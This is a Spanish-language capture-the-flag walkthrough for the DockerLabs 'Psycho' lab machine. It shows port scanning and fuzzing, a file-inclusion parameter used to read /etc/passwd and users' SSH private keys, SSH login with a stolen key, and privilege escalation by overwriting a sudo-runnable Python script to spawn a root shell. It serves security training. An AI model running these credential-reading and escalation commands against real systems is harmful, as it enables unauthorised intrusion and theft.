Psycho-DockerLabs🇪🇸

**1. Primero vamos a descomprimir las utilidades para la práctica a nuestro directorio**
```bash
unzip psycho.zip 
```

<img width="946" height="256" alt="image" src="https://github.com/user-attachments/assets/a0609946-2367-4f37-8445-8d5f52043377" />


**2. Ahora vamos a encender el laboratorio.**
```bash
sudo bash ./auto_deploy.sh psycho.tar 
```

<img width="950" height="536" alt="image" src="https://github.com/user-attachments/assets/cb41ea4b-d668-49d0-9840-5339c6cc4bfe" />

**3. Procedemos a comprobar si hay comunicación mediante un ping.**
```bash
 ping -c3 172.17.0.2
```

<img width="956" height="307" alt="image" src="https://github.com/user-attachments/assets/d34aa719-a647-4204-9b50-dadc824ccc00" />


**4. Nos preparamos para realizar un rastreo de puertos con nmap.**
```bash
 nmap -sCV 172.17.0.2
```

<img width="956" height="404" alt="image" src="https://github.com/user-attachments/assets/7778fe7a-dc44-4785-a5fd-9d6bcf8f9c74" />



**5. Ahora iremos a la web y nos fijaremos en el error.**

<img width="961" height="1001" alt="image" src="https://github.com/user-attachments/assets/58812b0a-0702-4e4f-be32-875d403d9dd3" />



**6. Al ver un error copilaremos un gobuster para poder observar alguna web oculta.**
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -r
```

<img width="950" height="501" alt="image" src="https://github.com/user-attachments/assets/81c3a785-9ada-4352-963c-0b0b15075766" />


**7.Ahora emplearemos un fuzzing para poder ver los metodos GET y descubrir algun parametro útil.**
```bash
ffuf -u "http://172.17.0.2/index.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 2596
```

<img width="971" height="513" alt="image" src="https://github.com/user-attachments/assets/e60cdc26-acea-4f7a-9cbd-ad15a20ee424" />


**8. Ahora descubrimos un parámetro secret entraremos a `http://172.17.0.2/index.php?secret=/etc/passwd` y veremos codigo abajo.**

<img width="971" height="1002" alt="image" src="https://github.com/user-attachments/assets/2d302cb1-68fc-4767-8700-9e8aff30e9fa" />


**9.Para poder observar de una manera más detallada el codigo usaremos curl**
```bash
curl -s "http://172.17.0.2/index.php?secret=/etc/passwd"
```
<img width="961" height="1050" alt="image" src="https://github.com/user-attachments/assets/60ab4a28-b795-431e-baa2-c8325c76689e" />

*Podremos identificar 4 usuarios: root, ubuntu, vaxei y luisillo*


**10. Ahora realizaremos un curl para obtener la contrasñea sabiendo los usuarios obtención de contraseña.**
```bash
 curl -s "http://172.17.0.2/index.php?secret=/home/luisillo/.ssh/id_rsa"
 curl -s "http://172.17.0.2/index.php?secret=/home/ubuntu/.ssh/id_rsa"
 curl -s "http://172.17.0.2/index.php?secret=/home/vaxei/.ssh/id_rsa"
```
*El único relevante es el vaxei porque muestra un extracto de private key al final.*

<img width="953" height="1040" alt="image" src="https://github.com/user-attachments/assets/058a396d-aa2b-4997-b5b3-026c2fc58e73" />


**11.1 Ahora abriremos un nano y escribiremos todo el texto del curl de vaxei.**
```bash
nano id_rsa_vaxei
```

<img width="947" height="1040" alt="image" src="https://github.com/user-attachments/assets/63909274-af7c-4aae-a3f1-e500efef1e7b" />


**11.2 Y vamos a darle permisos con chmod tipo 600**
```bash
 chmod 600 id_rsa_vaxei 
```

<img width="950" height="129" alt="image" src="https://github.com/user-attachments/assets/d561a6ee-87bd-4559-b9b4-f83b67b37277" />


**12.Realizaremos un ssh con la clave codificada obtenida.**
```bash
 ssh -i id_rsa_vaxei vaxei@172.17.0.2
```

<img width="920" height="246" alt="image" src="https://github.com/user-attachments/assets/b6114339-78e4-43de-8af6-bc9f1076b7f5" />


**13.1 Ejecutaremos `sudo -l` para poder ver que binarios podemos modificar**
```bash

```

<img width="948" height="172" alt="image" src="https://github.com/user-attachments/assets/527b41d8-7dcb-4c60-a54e-e9f2f168e901" />


**13.2 Ahora buscaremos el uid que necesitamos para escalar los privilegios.**
```bash
id
```

<img width="961" height="79" alt="image" src="https://github.com/user-attachments/assets/bc0a8905-5e68-4525-ba86-c9f8e4ae641e" />


**13.3 Ahora ejecutaremos un script para buscar que comandos puede usar para seguir con la escala de privilegios.**
```bash
find / -perm -u=s -type f 2>/dev/null
```

<img width="961" height="375" alt="image" src="https://github.com/user-attachments/assets/6f97c83f-ea1a-4a60-a583-d797c2011268" />


**13.4 Vamos a pasar a luisillo que tendrá mas privilegios.**
```bash
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
```

<img width="956" height="81" alt="image" src="https://github.com/user-attachments/assets/12849228-d1c1-46cf-9482-70b8f445da7a" />


**14.1 Ahora siendo luisillo vamos a ver nuestros privilegios `sudo -l` **

<img width="952" height="156" alt="image" src="https://github.com/user-attachments/assets/590b0a30-f968-4bbf-a555-c99ee112c1f2" />


**14.2 Vamos a leerle que hace lo que luisillo tiene permitido ejecutar.**
```bash
ls -ld /opt
cat /opt/paw.py
```

<img width="954" height="824" alt="image" src="https://github.com/user-attachments/assets/6866964f-df40-4578-a6b6-c38c43d6cf11" />


**14.3 Ahora vamos a remplazar el script por un script malicioso y asi poder hacer la escala de privilegios. Este script al ser ejecutado lanzará la shell como root.**
```bash
rm /opt/paw.py
echo 'import os; os.system("/bin/bash")' > /opt/paw.py
sudo /usr/bin/python3 /opt/paw.py
```

<img width="954" height="136" alt="image" src="https://github.com/user-attachments/assets/324ab971-f5df-4a48-bcdc-86f53038edf5" />






